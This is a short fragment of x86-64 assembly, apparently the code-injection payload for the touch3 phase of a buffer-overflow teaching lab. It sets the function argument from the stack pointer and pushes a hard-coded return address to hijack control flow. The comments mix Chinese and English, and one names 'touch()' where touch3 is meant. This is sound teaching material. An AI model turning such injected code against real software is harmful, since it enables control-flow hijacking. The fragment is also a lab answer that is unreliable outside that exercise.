movq %rsp,%rdi # 设置touch3()的参数
pushq  $0x4018fa      # make touch() be the return address
ret
